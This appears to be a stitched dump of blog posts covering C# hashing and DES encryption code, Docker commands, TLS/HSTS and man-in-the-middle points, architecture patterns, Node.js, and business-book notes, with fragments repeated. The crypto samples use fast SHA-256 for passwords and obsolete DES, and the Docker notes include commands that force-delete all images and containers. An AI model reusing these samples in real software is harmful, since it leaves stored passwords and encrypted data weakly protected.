RNGCryptoServiceProvider()) { var randomNumber = new byte[saltLength]; randomNumberGenerator.GetBytes(randomNumber); return randomNumber; } } private static byte[] Combine(byte[] first, byte[] second) { var ret = new byte[first.Length + second.Length]; Buffer.BlockCopy(first, 0, ret, 0, first.Length); Buffer.BlockCopy(second, 0, ret, first.Length, second.Length); return ret; } public static byte[] HashPasswordWithSalt(byte[] toBeHashed, byte[] salt) { using (var sha256 = SHA256.Create()) { return sha256.ComputeHash(Combine(toBeHashed, salt)); } } } PBKDF The salt does not have to be secret, which can be stored in the database. If the computational power become bigger, it still has risk just by adding salt.

Many former DES users now use Triple DES. Triple DES involved applying DES three times with 2 or 3 different keys. Triple DES was regarded as adequately secure, although it is quite slow. CLR uses a stream oriented design for cryptography. Core of the design is CryptoStream. public byte[] Encrypt(byte[] dataToEncrypt, byte[] key, byte[] iv) { using (var des = new DESCryptoServiceProvider()) { des.Mode = CipherMode.CBC; des.Padding = PaddingMode.PKCS7; des.Key = key; des.IV = iv; using (var memoryStream = new MemoryStream()) { var cryptoStream = new CryptoStream(memoryStream, des.CreateEncryptor(), CryptoStreamMode.Write); cryptoStream.Write(dataToEncrypt, 0, dataToEncrypt.Length); cryptoStream.FlushFinalBlock(); return memoryStream.ToArray(); } } } public byte[] Decrypt(byte[] dataToDecrypt, byte[] key, byte[] iv) { using (var des = new DESCryptoServiceProvider()) { des.Mode = CipherMode.CBC; des.Padding = PaddingMode.PKCS7; des.Key = key; des.IV = iv; using (var memoryStream = new MemoryStream()) { var cryptoStream = new CryptoStream(memoryStream, des.CreateDecryptor(), CryptoStreamMode.Write); cryptoStream.Write(dataToDecrypt, 0, dataToDecrypt.Length); cryptoStream.FlushFinalBlock(); return memoryStream.ToArray(); } } } How does DES and Triple DES work?

Docker/container technology becomes more and more popular these days. This blog introduces the basic concept of the above technology. Table of Contents What is docker In the old days, physical machine is the basic deployment unit which means one server hosts one application. The application has good isolation, however it is too expensive not only the hardware but also the maintaince effort. Then virtual machine model is introduced, see following figure: It helps but still expensive, since each virtual machine needs to support a full operating system. Thereby, docker is invented which is a lightweight virtual machine: The intention of docker is to provide isolation environment for applications and also cost efficient. Differences between VMs and Docker containers: Docker is application oriented, whereas VMs are operating-system-oriented Docker containers share an operating system with other Docker containers. In contrast, VMs each have their own operating system managed by a hypervisor Docker containers are designed to run one principal process, not manage multiple sets of processes Basic concepts Docker Engine: is also be called as docker daemon or docker runtime Images: An image is a collection of filesystem layers and some metadata. Taken together, they can be spun up as Docker containers Containers: A container is a running instance of an image. You can have multiple containers running from the same images Docker on your host machine is split into two parts: a daemon with a RESTful API and a client that talks to the daemon. Docker client is what you run when you type commands, whose job is to communicate with the Docker daemon via HTTP requests. Docker registry: For example, Docker hub. We can also have private registry in the company Layers Layers: A layer is a collection of changes to files. Docker layering helps you manage a big problem that arises when you use containers at scale. Imagine what would happen if you started up hundreds - or even thousands of same images, and each of those required a copy of the files to be stored somewhere. Disk space would run out pretty quickly. By default, Docker internally uses a copy-on-write mechanism to reduce the amount of disk space required. This partly explains how Docker containers can start up so quickly - they have nothing to copy because all the data has already been stored as the image. Some commands in the Dockerfile will create layer: RUN: RUN instruction will create a new layer while CMD is run time instruction. Equivalent of docker run ... ENV instruction can create variables, also add new layer. The variables can be used by $var1... When you push the image to the registry, only the new layer will be pushed. Tagging Understanding docker tags: Tags denote a version of your container Latest is used to denote latest published version Make tags always an ever increasing number Deployment options Docker is written in GoLang, currently there are many options for docker deployment. For instance, for Azure support only the following options are available: Azure Container service Azure app service Azure Service Fabric Basic commands Docker requires admin right, if you work on Linux OS like Ubuntu it is cumbersone to type sudo every time. You can use sudo su: to switch to root user. Get general information docker -v docker version: will give more information docker info uname -r/-a: show the kernal version Image docker build: Build a docker image. docker tag: Tag a docker image docker images: Show all docker images docker history [imagename] --no-trunc: Show the image layers docker rmi -f $(docker images -q): Remove all docker images Container docker ps: List containers. docker ps --all: List all containers, including the completed ones docker run: Run a docker image as a container. Run docker as detach mode: docker run \u2013d \u2013p 5000:5000 registry docker run -d --restart=on-failure/always/no docker commit: Commit a docker container as an image. When a docker commit is performed, this new area of disk is frozen and recorded as a layer with its own identifier. docker attach: Attach local standard input, output, and error streams to a running container docker rm: to remove a container docker top: Display the running processes of a container. docker inspect: Return low-level information on Docker objects. Docker logs: can see status inside a running container docker exec [containername] [command]: Run a command in a running container. For example: docker exec -it XXXX /bin/bash docker stop: stop the container. docker rm -f $(docker ps -a -q): delete all Docker containers Registry docker pull: Pull and image from docker registry. docker search: can find images to pull Others Use alias can help the efficiency: alias dps = docker ps docker has following logging level: debug: debug + info + error + fatal info: info + error + fatal error: error + fatal fatal docker -d -l debug: Setup the logging level.

Disk space would run out pretty quickly. By default, Docker internally uses a copy-on-write mechanism to reduce the amount of disk space required. This partly explains how Docker containers can start up so quickly - they have nothing to copy because all the data has already been stored as the image. Some commands in the Dockerfile will create layer: RUN: RUN instruction will create a new layer while CMD is run time instruction. Equivalent of docker run ...

In the web/cloud world, typical \"Man in the middle Insertion\" points can be the following options: Browser Wireless Router ISP Web Server SSL: Secure Sockets Layer TLS: Transport Layer Security SSL and TLS are both cryptographic protocols that provide authentication and data encryption between servers, machines and applications operating over a network. SSL is the predecessor to TLS. Technical Details TLS handshake The client sends a \"Client hello\" message to the server, along with the client's random value and supported cipher suites. The server responds by sending a \"Server hello\" message to the client, along with the server's random value. The server sends its certificate to the client for authentication and may request a certificate from the client. The server sends the \"Server hello done\" message. If the server has requested a certificate from the client, the client sends it. The client creates a random Pre-Master Secret and encrypts it with the public key from the server's certificate, sending the encrypted Pre-Master Secret to the server. The server receives the Pre-Master Secret. The server and client each generate the Master Secret and session keys based on the Pre-Master Secret. The client sends \"Change cipher spec\" notification to server to indicate that the client will start using the new session keys for hashing and encrypting messages. Client also sends \"Client finished\" message. Server receives \"Change cipher spec\" and switches its record layer security state to symmetric encryption using the session keys. Server sends \"Server finished\" message to the client. Client and server can now exchange application data over the secured channel they have established. All messages sent from client to server and from server to client are encrypted using session key. Redirect to HTTPS If your web site upgrade to https from http, you can do Redirecting to https: Client send http request Server return HTTP 301 (Moved Permanently) Client starts https request However, redirecting model has \"Man in the middle\" risk, not safe. Strict Transport Security A safer way is to use HTTP strict transport security (HSTS). Force all the http requests converted into https, including CSS, Javascript, fonts, images, favicon, media, etc. You will not see 301 response, but the following content in the header: Strict-Transport-Security: max-age=15552000; Go to HTTP site again, and you will get response 307 (Temporary Redirect). If there is Man in the middle attack, client may never receive response 307. A even safer way is to make reloaded. strict-transport-security: max-age=31536000; includeSubDomain;preload The relevant website is: https://hstspreload.org/ Mixed Content If your page contains unsecure resource, e.g. images, videos in iframe, https is not impleted correctly. If you just use //www.resourceaddress in your code, then it will 'inherit' the parent scheme when get the resource. Alternative solution is to use Content Security Policy (CSP). Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. Extended validation certificate An Extended Validation Certificate (EV) is a certificate used for HTTPS websites and software that proves the legal entity controlling the website or software package. Obtaining an EV certificate requires verification of the requesting entity's identity by a certificate authority (CA). Certificate When a web server is set up to accept https connections, the administrator must create a digital certificate for the web server. This certificate must then be signed by a certificate authority. This proves that the certificate owner is really the entity it states to be. Browsers are generally distributed with the signing certificates of known certificate authorities in order to verify that the certificates were really signed by them. Downgrade communication protocol One possible attack of https will be the client try to downgrade the communication version. Client claims it only has lower TLS version, and force the communication to be on lower version. Then use the opportunity to attack with the known vulnerabilities. Tools relevant PowerShell cmlet New-SelfSignedCertificate, Export-PfxCertificate can generate certificate locally (pfx file) To be used for release signing, a Software Publisher Certificate (SPC), and its private and public keys, must be stored in a Personal Information Exchange (.pfx) file. However, some certificate authorities (CAs) use different file formats to store this data. For example, some CAs store the certificate's private key in a Private Key (.pvk) file and store the certificate and public key in a .spc or .cer file. Fiddler Port 443 is the default port for https. By default, Fiddler can monitor http very well, but not https. Fiddler almost can see no communication if visit https websites. Check on the following options in Fiddler can see the https communication: HTTPS tab, Decrypt HTTPS traffic. What Fiddler will do is a man in the middle attack on the machine. Chrome Press F12 -> Application tab -> Cookies. Secure cookie cannot be get if it is on http channel. Press F12 and goto Security tab, you can see the certificates of the https web site.

Depending on the actual capabilities of the bus you use, the saga can be persisted, suspended and resumed as appropriate. See more details in the following URL: https://docs.particular.net/nservicebus/sagas/ Event sourcing & CQRS Event sourcing contain all the event and changes. By adding event sourcing to an application, you get a hold of raw data. By combining event sourcing and CQRS you end up with raw business events stored in the command stack properly denormalized for the sake of the application core functions. At any time, though, you can add an extra module that reads raw data and transforms that into other meaningful chunks of information for whatever business purpose you might have. When it comes to highlighting the benefits of event sourcing, the first point usually mentioned is this: with events you never miss a thing of what happens within the system. In a create, read, update, delete (CRUD) system, you typically have one representation of data - mostly relational - and one or more simple projects that most of the time just adapter tabular data to the needs of the presentation layer. With event sourcing, you take this model much further, and lowering the abstraction level of the stored data is the key factor. The more domain-accurate information you store, the richer and more numerious projections you can build at any later time. An approach to persistence that concentrates on persisting all the changes to a persistent state, rather than persisting the current application state itself. Combined the usage of snapshot. See details in article: https://msdn.microsoft.com/en-us/magazine/mt793267.aspx Data Integration patterns The four most common design patterns for data integration are broadcast, aggregation, bidirectional synchronization and correlation. Circuit breaker pattern Circuit breaker pattern prevent repeatedly trying to execute an operation that is likely to fail The circuit breaker is a proxy that monitors the number of recent failures Prevents wasting valuable resources because of the wait Normally, the client has some retry logic Multiple tenants app Per-tenant cost Scale: number of tenants, data volume, workload Tenant isolation: security, performance, lifetime management, etc business continuity, disaster recovery customization per-tenant (for some ISVs) Other patterns Actor Model: http://www.brianstorti.com/the-actor-model/ Content Delivery Network (CDN) pattern Uploading to storage: Do not use web server to do upload, use storage service Scale up & scale out: Tools SignalR ASP.NET SignalR is a new library for ASP.NET developers that makes it incredibly simple to add real-time web functionality to your applications. It's the ability to have your server-side code push content to the connected clients as it happens, in real-time. You may have heard of WebSockets, a new HTML5 API that enables bi-directional communication between the browser and server. SignalR will use WebSockets under the covers when it's available, and gracefully fallback to other techniques and technologies when it isn't, while your application code stays the same. SignalR also provides a very simple, high-level API for doing server to client RPC (call JavaScript functions in your clients' browsers from server-side .NET code) in your ASP.NET application, as well as adding useful hooks for connection management, e.g. connect/disconnect events, grouping connections, authorization.

By adding event sourcing to an application, you get a hold of raw data. By combining event sourcing and CQRS you end up with raw business events stored in the command stack properly denormalized for the sake of the application core functions. At any time, though, you can add an extra module that reads raw data and transforms that into other meaningful chunks of information for whatever business purpose you might have. When it comes to highlighting the benefits of event sourcing, the first point usually mentioned is this: with events you never miss a thing of what happens within the system. In a create, read, update, delete (CRUD) system, you typically have one representation of data - mostly relational - and one or more simple projects that most of the time just adapter tabular data to the needs of the presentation layer. With event sourcing, you take this model much further, and lowering the abstraction level of the stored data is the key factor. The more domain-accurate information you store, the richer and more numerious projections you can build at any later time. An approach to persistence that concentrates on persisting all the changes to a persistent state, rather than persisting the current application state itself. Combined the usage of snapshot.

It is easy to start, and also easy to get wrong. This blog covers the basics part of Node.js development. Table of Contents Module Require Every module in node is singleton. Use require to use module, the following is the search sequence of require method: First find js file Then json file Then node file If the module name is index.js, then it is okay just write directory name in the require parameter. require() can inject objects for dependency injection. Module exports From the modele itself, use exports keyword to make properties and methods available outside of the module file. exports.myDateTime = function () { return Date(); }; Http module http module can be used to write header or content. See following example: var http = require('http'); http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/html'}); res.write('Hello World!'); res.write(req.url); // read query string res.end(); }).listen(8080); File module File module can be used for file system operation. require(fs) var http = require('http'); var fs = require('fs'); http.createServer(function (req, res) { fs.readFile('demofile1.html', function(err, data) { res.writeHead(200, {'Content-Type': 'text/html'}); res.write(data); res.end(); }); }).listen(8080); Other useful methods in file module. write file: fs.appendfile(), fs.open(), fs.writefile() delete file: fs.unlink() rename: fs.rename() Url module Url module can be used to parse various parts of url. url.parse('https://www.pluralsight.com/search?q=buna') Url { protocol: 'https:', slashes: true, auth: null, host: 'www.pluralsight.com', port: null, hostname: 'www.pluralsight.com', hash: null, search: '?q=buna', query: 'q=buna', pathname: '/search', path: '/search?q=buna', href: 'https://www.pluralsight.com/search?q=buna' } example http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/html'}); var q = url.parse(req.url, true).query; var txt = q.year + \" \" + q.month; res.send(txt); }).listen(8080); Use the url for testing: http://localhost:8080/?year=2017&month=July Output is: 2017 July Event model The event model of node.js is asymmetric. The core part is event loop. For example, here is how Node.js handles a file request: Sends the task to the computer's file system. Ready to handle the next request. When the file system has opened and read the file, the server returns the content to the client. The event loop looks like this: The entity that handles external events and converts them into callback invocations A loop that picks events from the event queue and pushes their callbacks to the call back stack Node will process the event queue when call stack is empty There are three methods look quite similar, it will be good to understand the difference: setTimeout setImmediate Process.nextTick (not relevant event loop) NPM Npm is node package manager, which is the core part of javascript ecosystem. Commands Npm start, npm test: will run when there is start/test script in the package.json Npm -h: to show the help Npm help: can open a browser Npm init: will create the package.json Npm list: list all installed packages Npm can install global package, and can also install in local repository Npm can specify the versions when using npm i Npm can specify environment, e.g. --save, --prod, --dev NPM can choose install from 'gist' instead of a version, also can install from folder npm publish: can publish your package to npm registery Version Semantic version: major.minor.patch Patch increase when bug fixing Minor increase when introduce new feature Major increase when breaking changes In the package.json: ^means major version can be greater, ~means minor version can be greater npm version patch/minor/major to update the version info in the pcakge.json rather than manually change the version (it will also do the git commit for developers) Others Difference from client javascript Javascript in node.js app, differentiate client and server code. For example: server can call require while client can call windows. server code modification needs to restart node to see the changes, while client code just need browser refresh. console.log in the server code will output the message to terminal app, the client code will output the message the browser console. Uglify gulp can uglify your repository Error code If there is error, can use res.status(500).send(err) to return the error code bookRouter.route('/Books/:bookId').get(function(req, res)) { Book.findById(req.params.bookId, function(err, book) { if (err) { res.status(500).send(err); } else { res.json(book); } }) } Compare with Microsoft technologies Written by Binwei@Singapore","title":"Node.js Basics"},{"location":"2018/nodejs_basics/#nodejs-basics","text":"Published: Aug 11, 2018 Tags: web, backend Category: ComputerScience Recently, I used Node.js quite a lot to handle personal projects.

You only need to understand a few critically important concepts that provide most of the value. When you first start to study a field, it seems like you have to memorize a zillion things. You don't. What you need is to identify the core principles - generally three to twelve of them - that govern the field. The million things you thought you had to memorize are simply various combinations of the core principles. Business Processes Roughly defined, a business is a repeatable process that: Creates and delivers something of value That other people want or need At a price they're willing to pay In a way that satisfies the customer's needs and expectations So that the business brings in enough profit to make it worthwhile for the owners to continue operation +----------------+---------------------------------------+--------------------------------------------+ | Processes | Definition | KPI | +----------------+---------------------------------------+--------------------------------------------+ | Value creation | Discovering what people need or want, | How quickly is the system creating value? | | | then creating it | What is the current level of inflows? | +----------------+---------------------------------------+--------------------------------------------+ | Marketing | Attracting attention and building | How many people are paying attention to | | | demand for what you've created | your offer?

Rule #1 of marketing is that your potential customer's available attention is limited: Receptivity is a measure of how open a person is to your message Advertising is the tax you pay for being unremarkable Being remarkable is the best way to attract attention The essence of effective marketing is discovering what people already want, then presenting your offer in a way that intersects with that preexisting desire. The best marketing is similar to Education-Based Selling: It shows the prospect how the offer will help them achieve what they desire. Your job as a marketer isn't to convince people to want what you're offering; it's to help your prospects convince themselves that what you're offering will help them get what they really want. When your work speaks for itself, don't interrupt. There are several tools for marketing: Relative Importance Testing: A method that helps you determine what people actually want by asking them questions designed to simulate real life tradeoffs. Framing: is the act of emphasizing the details that are critically important while de-emphasizing things that aren't, by either minimizing certain facts or leaving them out entirely. Hook: is a single phrase or sentence that describes an offer's primary benefit. Messages with clear call-to-action: Ensure that every message you create has a clear Call-To-Action, and you'll dramatically increase the effectiveness of your marketing activities. Controversy: means publicly taking a position that not everyone will agree with, approve of, or support. Used constructively, Controversy can be an effective way to attract Attention. People start talking, engaging and paying Attention to your position, which is a very good thing. Sales The sales process begins with a prospect and ends with a paying customer. There are several tools for sales: Critical Assumptions: Are facts or characteristics that must be true in the real world for your offering to be successful. Shadow Testing: is the process of selling an offering before it actually exists. Shadow testing is very useful strategy you can use to actually test your critical assumptions with real customers quickly and inexpensively. Mental Simulation: The most effective way to get people to want something is to encourage them to Visualize what their life would be like once they've accepted your offer. Sale vs Buy: People don't like to be sold, but they love to buy. Value-based selling: is not about talking - it's about listening. In reality, the best sales people are the ones who can listen intently for the things the customer really wants. SPIN selling: understanding the situation; defining the problem; clarifying the short-term and long-term implications of that problem; quantifying the need-payoff, or the financial and emotional benefits the customer would experience after the resolution of their problem Education-based selling is the process of making your prospects better, more informed customers. By investing energy in making your prospects smarter, you simultaneously build trust in your expertise and make them better customers. Be forewarned, however, that effective education requires your offer to be superior in some way to your competitors Risk reversal: When it comes to closing sales, you are that risk. Risk reversal is a strategy that transfer some (or all) of the risk of a Transaction from the buyer to the seller Reactivation is the process of convincing past customers to buy from you again Important sales principles: Without a certain amount of Trust between parties, a Transaction will not take place. Pricing Uncertainty Principle: all prices are arbitrary and malleable. The pricing uncertainty principle has an important corollary: you must be able to support your asking price before a customer will actually accept it. 4 ways to support a prices on something of value: replacement cost: How much would it cost to replace? market comparison: How much are other things like this selling for? discounted cash flow/net present value: How much is it worth if it can bring in money over time? value comparison: Who is this particularly valuable to? In stead of barging in with a premature, boilerplate hard sell, successful salespeople focus on asking detailed questions to get to the root of what the prospect really wants. By encouraging your prospects to tell you more about what they need, you reap two major benefits. you increase the prospect's confidence in your understanding of the situation, increasing their confidence in your ability to deliver a solution you'll discover information that will help you emphasize just how valuable your offer is, which helps you in Framing the price of your offer versus the value it will provide There several barriers to purchase: It costs too much => Framing, Value based selling It won't work => Social Proof, Referrals It won't work for ME I can wait => Education-based selling It's too difficult Your Next Best Alternative is what you'll do in the event you can't find common ground with the party you're negotiating with. The first phase of every negotiation is the setup: setting the stage for a satisfying outcome to the negotiation. A buffer is a third party empowered to negotiate on your behalf, to avoid permanently harming your relationship with the other party. Value delivery A Value Stream is the set of all steps and all processes from the start of your Value Creation process all the way through the delivery of the end result to your customer. In general, try to make your Value Stream as small and efficient as possible. Measurement: Expectation effect: Quality = performance - expectations Throughput: is the rate at which a system achieves its desired goal, which is a measure of the effectiveness of your Value Stream Multiplication: is duplication for an entire process or system. Products are typically easiest to duplicate, while shared resources are easiest to multiply Finance Finance is the art and science of watching the money flowing into and out of a business, then deciding how to allocate it and determine whether or not what you're doing is producing the results you want. Terminology: Profit margin: is the difference between how much revenue you capture and how much you spend to capture it, expressed in percentage term. Value capture: is the process of retaining some percentage of the value provided in every transaction Pricing power: is your ability to raise the prices you're charging over time. The less value you're capturing, the greater your pricing power. Lifetime Value: is the total value of a customer's business over the lifetime of their relationship with your company. One of the reasons Subscriptions are so profitable is that they naturally maximize lifetime value Allowable Acquisition Cost (AAC): is the marketing component of Lifetime Value. The higher the average customer's Lifetime Value, the more you can spend to attract a new customer, making it possible to spread the word about your offer in new ways. Subscription: the first sale is sometimes called a 'loss leader' - an enticing offer intended to establish a relationship with a new customer. Many subscription business use loss leaders to build their subscriber base. Amortization: is the process of spreading the cost of a resource investment over the estimated useful life of that investment. Funding: can help you do things that would otherwise be impossible with your current budget. Initial public offering (IPO): is simply the first public stock offering a company offers on the open market. Any investor who purchases shares is legally a partial owner of the company, which includes the right to participate in management decision via electing the board of directors. Whoever owns the most shares in the company controls it, so 'going public' creates the risk of a hostile takeover. Bootstrapping: is the art of building and operating a business without funding. Investors increases communication overhead, which can adversely affect your ability to get things done quickly. Funding can be useful, but be wary of giving up control over your business's operations - don't do it lightly or blindly Manage Risks What get measured gets managed - Peter Drucker Risks are known unknowns. Uncertainties are unknown unknown. Without data, you are blind. If you want to improve anything, you must measure it first. Here's the primary problem with Measurement: you can measure a million different things. Measure too much, and you'll inevitably suffer from the Cognitive Scope Limitation, drowning in a sea of meaningless data. Garbage in, garbage out is a straightforward principle: put useless input into a system, and you'll get useless output. Analytical Honesty: means measuring and analyzing the data you have dispassionately. Having an experienced but dispassionate third party audit your measurement and analysis practices is a neat workaround Counterparty risk: is the possibility that other people won't deliver what they have promised, which is amplified by the planning fallacy If you don't believe in sampling theory, next time you go to the doctor and he wants to take a little blood, tell him to take it all A Mean (or average) is calculated by adding the quantities of all data points, then dividing by the total number of data points available. (Easy to be affected by the outliers) A Median is calculated by sorting the values in order of high to low, then finding the quantity of data point in the middle of the range A Mode is the value that occurs most frequently in a set of data. A Midrange is the value halfway between the highest and lowest data points in a set values. To calculate the Midrange, add the highest and lowest values, then divide by two. Correlation is not Causation. Other facts of business Resilience is never 'optimal' if you evaluate a System solely on Throughput. Flexibility always comes at a price. A turtle's shell is heavy - it could certainly move faster without it. Giving it up, however, would leave the turtle vulnerable in the moments when moving a little faster just isn't fast enough. In an effort to chase a few more short-term dollars, many business trade Resilience for short-term results - and pay a hefty price. Scenario planning is the essence of effective strategy. Trying to base your actions on predictions of interest rates, oil prices, or stock values is a fool's game. Instead of trying to predict the future with 100 percent accuracy, Scenario Planning can help you prepare for many different possible futures. Business is never easy - it's an art as much as a science. Constant experimentation is the only way you can identify what will actually produce the result you desire. The limits of my language are the limits of my world - Ludwig Wittgenstein Business school don't create successful people. They simply accept them, then take credit for their success. Feedback: Get feedback from real potential customers instead of friends and family Ask open-ended questions Steady yourself, and keep calm Take what you hear with a grain of salt Give potential customers the opportunity to preorder Everything we hear is an opinion, not a fact. Everything we see is a perspective, not the truth. - Marcus Aurelius Body and Mind Body Eat high-quality food. Garbage in, garbage out: pay attention to what you put into your body. If you eat meat, eggs, or dairy, avoid sources that contain antibiotics or hormones. Also avoid refined sugar and processed foods as much as possible. Even low-intensity physical activity increases energy, improves mental performance and enhances your ability to focus. Get at least seven to eight hours of sleep each night. Going to bed early helps you get up early, which is very useful if you do creative work - I find it's best to write or do other creative tasks before the day begins, so you don't get distracted and run out of time. Get enough sun, but not too much -> Vitamin D Mind We've evolved to avoiding expending energy unless absolutely necessary, which I call Conservation of Energy Marathon: When you're so tired that it feels like you're about to kick the bucket any second, physiologically, you're not even remotely close to actually dying. The signals your brain is sending to your body are a ruse that serves as a warning, prompting you to keep some energy in reserve, just in case energy is needed later. Conservation of Energy explains why some people stay in dead-end jobs for decades, even though they know the position isn't great. Instead of relying on willpower to keep doing something, change the structure of Environment to support your choices. Guiding Structure means the structure of your environment is the largest determinant of your behavior. If you want to successfully change a behavior, don't try to change the behavior directly. Change the structure that influences or supports the behavior, and the behavior will change automatically. Inhibition is the ability to temporarily override our nature inclinations. Willpower is the fuel of inhibition. Overriding our instincts can often make it possible to collect larger rewards later - spending is easy, but saving is not, even if the latter is more beneficial over time. Loss aversion: People respond twice as strongly to potential loss as they do to the opportunity of an equivalent gain. Casinos win by abstracting the loss. Instead of having players gamble with currency, which is perceived as valuable, the casino coverts currency into chips or debit cards, which don't feel as valuable. As the player loses this 'fake' money over time, the casino will provide 'rewards' like free drinks, T-shirts, room upgrades, or other benefits to alleviate any remaining sense of loss. As a result, losing becomes 'no big deal', so players continue to play - and continue to lose money night after night. Absence Blindness also makes it uncomfortable for people to 'do nothing' when something bad happens, even if doing nothing is the best course of action. Often, the best course of action is to choose not to act, but that's often difficult for humans to accept emotionally. Experience makes it easier to avoid Absence Blindness. Experience is valuable primarily because the expert has a larger mental database of related Patterns, and thus a higher chance of noticing an absence. By noticing violations of expected Patterns, experienced people are more likely to get an 'odd feeling' that things 'aren't quite right', which is often enough warning to find an issue before it becomes serious. Contrasting is often used to influence buying decisions. In the business world, contrast is often used as pricing camouflage. In the case of the $60 shirt, it may be possible to buy the exact same shirt at another retailer for $40, but the less expensive shirt isn't present in the store where the comparison is taking place. What is present is the $400 suit, which makes the $60 shirt look like a bargain. Scarcity encourages people to make decisions quickly. Scarcity is one of the things that naturally overcomes our tendency to conserve - if you want something that's scarce, you can't afford to wait without the risk of losing what you want. Limited quantities Price increases Deadlines Novelty - the presence of new sensory data - is critical if you want to attract and maintain attention over a long period of time. One of the reasons people can focus on playing games or surfing the Internet for hours at a time is novelty - every new viral video, blog post, Facebook update, Twitter post and news report reengages our ability to pay attention. Even the most remarkable object of attention gets boring over time. Continue to offer something new, and people will pay attention to what you have to offer. Monoidealism is the state of focusing your energy and attention on only one thing, without conflicts. Monoidealism is often called a 'flow' state We are what we repeatedly do. Excellence, then, is not an act, but a habit. No decision, large or small, is ever made with complete information. Since we can't predict the future, we often attribute the feeling of indecisiveness to a lack of information. Externalization takes advantage of our perceptual abilities in a very intelligent way. There are two primary ways to externalize your thoughts: writing and speaking. Counter-factual Simulation as applied imagination - you're consciously posing a 'what if' or 'what would happen if' question to your mind, then sitting back and letting your brain do what it does best. A doomsday Scenario is a counterfactual simulation where you assume everything that can go wrong does go wrong. Caveman Syndrome makes our ancient brains over dramatic, so they assume every potential threat is a life-or-death situation. Excessive Self-Regard Tendency is the natural tendency to overestimate your own abilities, particularly if you have little experience with the matter at hand. Dunning-Kruger effect: Incompetent individuals tend to overestimate their own level of skills Incompetent individuals fail to recognize genuine skill in others Incompetent individuals fail to recognize the extremity of their inadequacy If they can be trained to substantially improve their own skill level, these individuals can recognize and acknowledge their own previous lack of skill Confirmation Bias is the general tendency for people to pay attention to information that supports their conclusions and ignore information that doesn't. Looking for not confirming information is uncomfortable, but it's useful, whatever you ultimately decide. hindsight Bias is the natural tendency to kick yourself for things you 'should have known'. It's important to realize that these feelings are irrational - your decisions were based on the best information you had at the time, and there's nothing you can do now to change them. Understanding your Locus of Control is being able to separate what you can control (or strongly influence) from what you can't. Trying to control things that aren't actually under your control is a recipe for eternal frustration. Focus most of your energy on things that you can influence, and let everything else go. Relationship All human relationships are based on Power - the ability to influence the actions of other people. We don't have direct access to the inner processes that make people do the things they do. All we can really do is act in ways that encourage people to do what we suggest. On the whole, influence is much more effective than compulsion. Comparative Advantage means it's better to capitalize on your strengths than to shore up your weaknesses. Focus on what you can do well, and work with others to accomplish the rest. Golden Trifecta: Appreciation Courtesy Respect Treating other people poorly sends a clear signal to everyone that you can't be trusted. Humans are predisposed to look for behavioral causes. People will be more receptive to any request if you give them a reason why. Any reason will do. Commander's Intent is a much better method of delegating tasks: whenever you assign a task to someone, tell them why it must be done. The more your agent understands the purpose behind your actions, the better they'll be able to respond appropriately when the situation changes. Accountability is about one person taking responsibility. If two people are accountable for the same decision, no one is really accountable. Bystander Apathy is an inverse relationship between the number of people who could take action and the number of people who actually choose to act. The more people available, the less responsibility each member of the crowd feels to do anything about the situation. Pygmalion Effect: Let others know you expect great work from them, and they'll do their best to live up to your expectation. The Attribution Error means that when others screw up, we blame their character; when we screw up, we attribute the situation to circumstances. A compromise is the art of dividing a cake in such a way that everyone believes he has the biggest piece - Ludwig Erhard Common Ground is a state of overlapping interests between two or more parties. Negotiation is the process of exploring different options to find Common Ground. The more potential paths you explorer, the greater the chance you'll be able to find one in which your interests overlap.

Garbage in, garbage out is a straightforward principle: put useless input into a system, and you'll get useless output. Analytical Honesty: means measuring and analyzing the data you have dispassionately.

(Easy to be affected by the outliers) A Median is calculated by sorting the values in order of high to low, then finding the quantity of data point in the middle of the range A Mode is the value that occurs most frequently in a set of data. A Midrange is the value halfway between the highest and lowest data points in a set values. To calculate the Midrange, add the highest and lowest values, then divide by two.

Trying to base your actions on predictions of interest rates, oil prices, or stock values is a fool's game. Instead of trying to predict the future with 100 percent accuracy, Scenario Planning can help you prepare for many different possible futures. Business is never easy - it's an art as much as a science. Constant experimentation is the only way you can identify what will actually produce the result you desire. The limits of my language are the limits of my world - Ludwig Wittgenstein Business school don't create successful people. They simply accept them, then take credit for their success. Feedback: Get feedback from real potential customers instead of friends and family Ask open-ended questions Steady yourself, and keep calm Take what you hear with a grain of salt Give potential customers the opportunity to preorder Everything we hear is an opinion, not a fact.

Garbage in, garbage out: pay attention to what you put into your body. If you eat meat, eggs, or dairy, avoid sources that contain antibiotics or hormones. Also avoid refined sugar and processed foods as much as possible. Even low-intensity physical activity increases energy, improves mental performance and enhances your ability to focus. Get at least seven to eight hours of sleep each night. Going to bed early helps you get up early, which is very useful if you do creative work - I find it's best to write or do other creative tasks before the day begins, so you don't get distracted and run out of time.

The signals your brain is sending to your body are a ruse that serves as a warning, prompting you to keep some energy in reserve, just in case energy is needed later. Conservation of Energy explains why some people stay in dead-end jobs for decades, even though they know the position isn't great. Instead of relying on willpower to keep doing something, change the structure of Environment to support your choices. Guiding Structure means the structure of your environment is the largest determinant of your behavior. If you want to successfully change a behavior, don't try to change the behavior directly. Change the structure that influences or supports the behavior, and the behavior will change automatically. Inhibition is the ability to temporarily override our nature inclinations. Willpower is the fuel of inhibition. Overriding our instincts can often make it possible to collect larger rewards later - spending is easy, but saving is not, even if the latter is more beneficial over time. Loss aversion: People respond twice as strongly to potential loss as they do to the opportunity of an equivalent gain. Casinos win by abstracting the loss. Instead of having players gamble with currency, which is perceived as valuable, the casino coverts currency into chips or debit cards, which don't feel as valuable. As the player loses this 'fake' money over time, the casino will provide 'rewards' like free drinks, T-shirts, room upgrades, or other benefits to alleviate any remaining sense of loss. As a result, losing becomes 'no big deal', so players continue to play - and continue to lose money night after night. Absence Blindness also makes it uncomfortable for people to 'do nothing' when something bad happens, even if doing nothing is the best course of action. Often, the best course of action is to choose not to act, but that's often difficult for humans to accept emotionally. Experience makes it easier to avoid Absence Blindness. Experience is valuable primarily because the expert has a larger mental database of related Patterns, and thus a higher chance of noticing an absence. By noticing violations of expected Patterns, experienced people are more likely to get an 'odd feeling' that things 'aren't quite right', which is often enough warning to find an issue before it becomes serious. Contrasting is often used to influence buying decisions. In the business world, contrast is often used as pricing camouflage. In the case of the $60 shirt, it may be possible to buy the exact same shirt at another retailer for $40, but the less expensive shirt isn't present in the store where the comparison is taking place. What is present is the $400 suit, which makes the $60 shirt look like a bargain. Scarcity encourages people to make decisions quickly. Scarcity is one of the 